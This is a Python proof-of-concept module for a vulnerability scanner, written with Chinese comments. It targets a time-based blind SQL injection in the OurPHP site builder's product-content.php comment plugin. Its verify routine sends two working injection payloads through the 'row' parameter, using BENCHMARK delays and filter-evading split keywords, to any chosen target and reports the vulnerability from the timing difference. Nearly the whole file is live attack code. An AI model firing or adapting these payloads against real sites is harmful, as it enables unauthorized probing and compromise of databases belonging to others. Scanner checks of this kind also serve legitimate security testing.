# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse
import time


class Vuln(ABVuln):
    vuln_id = 'OurPHP_0001'  # 平台漏洞编号，留空
    name = 'OurPHP SQL盲注'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-10-27'  # 漏洞公布时间
    desc = '''
        OURPHP是一个品牌,一款基于PHP+MySQL开发符合W3C标准的建站系统。
        傲派软件（OurPHP）在 /function/plugs/Comment/product-content.php 存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=149584'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'OurPHP(傲派软件)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '99723f43-ca5c-4b14-98d2-e0083b1a3aa7'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer     :WooYun-2015-149584
            hh = hackhttp.hackhttp()
            arg = self.target
            start_time1 = time.time()
            payload = '/function/plugs/Comment/product-content.php?id=1&row=10%20PROCEDURE%20analyse((sel||ect%20extractvalue(ran||d(),concat(0x3a,(IF(SUBSTRING(version(),1,1)%20LIKE%205,%20BENCHMARK(2,SHA1(1)),1))))),1)'
            url = arg + payload
            code1, head, res, errcode, _ = hh.http(url)
            true_time = time.time() - start_time1

            payload = '/function/plugs/Comment/product-content.php?id=1&row=10%20PROCEDURE%20analyse((sel||ect%20extractvalue(ran||d(),concat(0x3a,(IF(SUBSTRING(version(),1,1)%20LIKE%205,%20BENCHMARK(10000000,SHA1(1)),1))))),1)'
            url = arg + payload
            start_time2 = time.time()
            code2, head, res, errcode, _ = hh.http(url)
            flase_time = time.time() - start_time2
            # print flase_time ,true_time
            if code1 == 200 and code2 == 200 and flase_time/true_time > 10:
                # security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
